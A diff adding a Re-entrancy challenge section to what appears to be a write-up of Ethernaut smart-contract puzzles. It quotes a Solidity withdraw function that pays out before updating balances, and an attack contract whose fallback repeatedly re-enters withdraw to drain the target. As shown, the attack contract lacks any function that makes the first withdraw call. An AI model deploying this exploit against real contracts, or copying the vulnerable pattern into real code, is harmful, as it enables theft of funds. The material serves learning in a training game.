@@ -273,3 +273,51 @@ contract Solution {
 
 In the 3rd line of vulnerable function it's sending the ether to the previous king and than set highest ether sender user as king. In our attack contract when the vulnerable contract will try to send ether for setting new king. Our contract will revert that and other user will never be able to become king
 
+
+
+
+# 10. [Challenge 10: Re-entrancy](https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D)
+
+Tasks:
+- The goal of this level is for you to steal all the funds from the contract.
+
+**Solution:** \
+Vulnerable Code:
+```
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}("");
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+```
+
+Attack Payload:
+```
+pragma solidity ^0.6.10;
+
+import './Reentrance.sol';
+
+contract EthernautReentrancyAttack {
+    Reentrance target; 
+    uint public amount = 1 ether;    //withdrawal amount each time
+    
+    constructor(address payable _targetAddr) public payable {
+        target = Reentrance(_targetAddr);
+    }
+    
+    function donateToTarget() public {
+        target.donate.value(amount).gas(4000000)(address(this)); //need to add value to this fn
+    }
+    
+    fallback() external payable {
+        if (address(target).balance != 0 ) {
+            target.withdraw(amount); 
+        }
+    }
+}
+```
+This contract is vulnerable to re-entracy attack as it's updating user balance after external contract call. So malicious can create a loop on withdraw function from 1st line to 3rd line and it will withdraw all the ether available on the contract.
